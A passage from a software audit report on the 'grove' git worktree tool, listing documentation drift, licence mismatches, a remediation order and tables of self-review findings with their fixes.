sections; the "Naming Conventions" input transformations (lowercase/space→hyphen/
max-50) are unimplemented; `grove to` fuzzy-matching + "Did you mean?" +
ambiguity handling is unimplemented; `grove ls` output spec (marker glyph,
statuses, `frozen` field) drifted; `grove fetch` is absent from the command
list; `new`/`open` flag lists omit `--no-tmux`/`--no-docker`. Several of these
overlap with confirmed bugs (**B2**, **B18**, **B31**).

**Cross-checked against code and still-wrong doc events:** `pre_switch`/
`post_switch`/`pre_create` recipes (→ **B6**), `on_failure="fail"` (→ **B7**),
`docker:compose` `timeout` claimed "enforced by the executor" (it's ignored),
and the `hooks.Context` struct in `PLUGIN_DEVELOPMENT.md` omits the path fields
plugin authors need (the omission behind **B16**).

A complete itemized list (63 verified doc findings, grouped by file, with
line numbers and corrections) is available on request.

---

## Cross-repo (`homebrew-tap`, `plugins`)

- **X1** `.github/formula.rb.tmpl:6` and `homebrew-tap/Formula/grove.rb`
  declare `license "MIT"`; the repo is **Apache-2.0** (`LICENSE`,
  `plugin.json`). Correct the formula and template.
- **X2** `release.yml` Homebrew job — see **S1** (unsafe sha256 pipeline).
- The `plugins` marketplace manifest and the git-subdir skill path
  (`skills/grove-worktree-management`) are consistent with the grove repo;
  version gate `grove >= 0.8.0` matches. No issues found there.

---

## Verified clean (spot-checked, no action needed)

`cmdexec` timeout/cancel handling; `parseWorktreeList` state machine (detached/
prunable/bare); `List()` parallel dirty checks; `AllBranchUpstreams` batching and
left-right count order; `TmuxSessionName` `.`/`:` sanitization + `exactTarget`
prefix-match guard; custom naming-pattern round-trip (dir vs canonical tmux name);
`ResolveDirtyAction` matrix; state save rebase-merge + atomic rename + `Batch`;
future-version state guard; `SafeJoin` traversal rejection (one `..`-prefix
false-positive noted); `updatecheck` skip gates and back-off; Windows
cross-compile; `%w` wrapping discipline (319 sites); `panic()` limited to a test
fake; startup does no heavy work before flag parsing.

---

## Suggested remediation order

1. **B3, B2, B1** — data-loss / state-corruption trio (destructive `rm`, wrong-
   worktree resolution, state fragmentation). Highest user impact.
2. **B5, B9** — clean, self-contained, high-confidence one-line-ish fixes
   (graft panic, diff --stat).
3. **B4** — born-dirty `.grove/` (unblocks agent workflows and removes the
   pressure toward reflexive `--force` that feeds B3).
4. **B13, S1, X1** — security + release/legal correctness.
5. **B6/B7/B8/B32** — hook execution + bootstrap consolidation (one refactor,
   several findings).
6. **P1** — the one real perf regression.
7. Documentation sweep (D1–D6) — largely mechanical once the code behavior above
   is settled.

---

## PR #140 self-review — findings and remediation (second pass)

An adversarial multi-angle review of the audit PR itself surfaced 16 findings
(2 regressions the audit introduced, several audit fixes applied unevenly, and
new latent bugs found while tracing). All are fixed on this branch:

| # | Finding | Resolution |
|---|---------|------------|
| R1 | `.grove/config.toml` listed in the machine-local excludes — a fresh `grove init`'s config was invisible to `git add .`, so the "commit this to your repo" workflow (README) silently failed | Entry removed; `EnsureGroveExcludes` migrates legacy exclude blocks in place; per-worktree config symlink removed entirely (config resolution anchors at the main worktree via `grove.GitCommonDir`); `grove init` nudges `git add .grove` |
| R2 | Bare `${GROVE_HOOK_x}` rewrite silently broke single-quoted hook recipes (`pkill -f '{{.worktree}}'` shipped in examples) and word-split bare tokens on spacey paths | `InterpolateShell` is quote-context-aware: `"${VAR}"` bare, `${VAR}` in double quotes, `'"${VAR}"'` splice in single quotes; injection tests extended to all contexts |
| R3 | TUI delete ignored the B7 required-hook abort (`runPreRemoveHooks` swallowed errors) | Error propagates; dashboard delete aborts with the worktree intact; explicit `.grove` dir passed to the executor |
| R4 | `grove fork` skipped `ValidateWorktreeName` (`fork root` collided with reserved keys) | Same guard as new/open/rename/TUI wired in + e2e test |
| R5 | `config.Load()` (TUI, `grove config`) stayed cwd-based — the B1 fragmentation on the config axis | `GetConfigPaths` resolves via `grove.FindRoot` with a cwd fallback for pre-init flows |
| R6 | `pre_create`/`post_remove` command hooks defaulted `working_dir` to the guaranteed-absent "new" path (chdir ENOENT every run) | Event-aware default: those two events run from the main worktree; explicit `"new"` still honored |
| R7 | `grove sync --json` error paths called `os.Exit` before emitting any JSON | `syncExit` prints the result document (skipped entry + reason) first, keeping the non-zero exit code |
| R8 | Born-dirty fix only ran from `grove init` — a fresh clone + `grove new` recreated `?? .grove/` | `EnsureGroveExcludes` also called from worktree bootstrap and fork (best-effort) |
| R9 | TUI bulk delete force-removed dirty worktrees with no indication | Bulk overlay marks dirty candidates (`⚠ uncommitted changes`) and counts selected dirty items before the confirm; single-delete overlay already warned |
| R10 | `mergeExternalComposeConfig` mutated the base config through an aliased pointer and shared slice/Agent backing with the override | Fresh merged struct; every slice/pointer field cloned; regression test asserts inputs are never mutated |
| R11 | Bare-token word-splitting on paths with spaces/globs | Folded into R2 (bare tokens now double-quoted) |
| R12 | DRY leftovers: triplicate git-common-dir resolvers, double hooks.toml load per switch, ls/here session-map copy, performSwitch/open tmux-mode dup, stale comments | `grove.GitCommonDir`, `loadConfigHookExecutor`/`runConfigHooksWith`, `loadTmuxSessions`, `resolveTmuxMode`; comments fixed |
| R13 | TUI create hand-rolled bootstrap — skipped SetupFiles, plugin post-create hooks (docker Up), excludes, required-abort | `runPostCreateStreaming` routes through `worktree.BootstrapWorktree` with a capture writer; tmux created after bootstrap (CLI order) |
| R14 | `grove open`/`attach` fire no switch hooks (docker auto_start never runs on those paths) | **Deferred by design for now**: `open` is an editor/session command, not a switch — firing docker lifecycle hooks there changes its contract. Candidate for a follow-up decision |
| R15 | `SetProjectConfigValues` wrote cwd-relative — from a linked worktree the atomic rename replaced the config symlink with a private diverging copy | Fixed by R5 (write path shares `GetConfigPaths`) + symlink removal; regression test writes from a linked worktree and asserts main's file changed |
| R16 | `BootstrapWorktree` hook output fell through to `os.Stdout` (corrupting `grove new --json` and any TUI caller) | Hook output follows the caller's writer; discarded for silent/JSON callers |

Plugin-track hooks (`hooks.Fire`) intentionally remain warn-and-continue on
every path — infrastructure hooks don't abort user operations; only explicit
`on_failure = "fail"` hooks.toml actions do.

### Second review wave (line-by-line + removed-behavior finders)

| # | Finding | Resolution |
|---|---------|------------|
| R17 | Load-time normalization (`working_dir "" → "new"`) erased the unset signal before the executor's event-aware default could fire — default-configured `pre_create` hooks still failed chdir (caught end-to-end; the unit test had bypassed the load path) | Normalization removed; regression test goes through `LoadHooksConfig` |
| R18 | `AtomicWriteFile`'s explicit `Chmod(0644)` ignores the umask — pre-audit writers used `O_CREATE` perms, so `state.json` was 0600 under `umask 077`; the consolidation silently made it world-readable | Temp file now created with `perm` at `O_CREATE` (umask-filtered, `os.WriteFile` semantics); unix test pins it |
| R19 | Agent section wholesale-replaced on override — a `config.local.toml` setting only `agent.max_slots` wiped `template_path` (B29 one level deeper) | `mergeAgentStackConfig` field-merges, returns a fresh struct |
| R20 | Required `pre_switch` hook abort fired *after* auto-stash + `SetLastWorktree` — an aborted switch silently parked the user's work in a stash and corrupted the `grove last` toggle | Abort pops the auto-stash back (with recovery hint on pop failure); `last_worktree` recorded only once the switch proceeds; e2e test |
| R21 | `grove open`'s agent-mode/tmux-off early return skipped `TouchWorktree`, so `grove trim` saw actively-used worktrees as stale | Touch moved above the tmux branching |
| R22 | `grove fetch pr/N` re-fetch used a stale local branch (B10's fetch-skip is right for fork, wrong for fetch) | fetch fast-forwards the local PR ref first (non-fatal on divergence/offline) |
| R23 | Captured commands run in panes of a tmux server that inherited a stale `GROVE_CD_FILE` wrote the cd target to the dead temp file — no `cd:` line, shell silently stayed put | Wrapper capture branch clears `GROVE_CD_FILE` explicitly; ShellVersion 8→9 |

| R24 | Upgrade surfacing: the excludes migration ran only on init/bootstrap, so upgraded repos hit the ignored-config symptom with no explanation until the next worktree creation | Self-healing migration on every project command (`RequireGroveContext` + bare-grove TUI, beside the shell-version preflight) with a one-time stderr notice keyed off actual legacy-entry removal — idempotent, so it can never repeat and needs no "seen" state; `grove doctor` flags legacy per-worktree symlinks with the exact removal commands; AGENTS.md + AGENT_GUIDE gained upgrade-assist sections |

Reviewed and left as-is (with rationale): the `grove to` self-switch no-op is
spec-mandated (B18); `grove last` attaching tmux outside shell integration is
the intended "behave exactly like `grove to`" alignment (B19); main-worktree
`.grove` taking precedence over a nested subproject `.grove` is the B1
anchoring working as designed — nested grove projects inside one repo are not
a supported layout; a required `post_switch` failure aborting after state
touches is inherent to post-hooks (the switch has effectively happened).
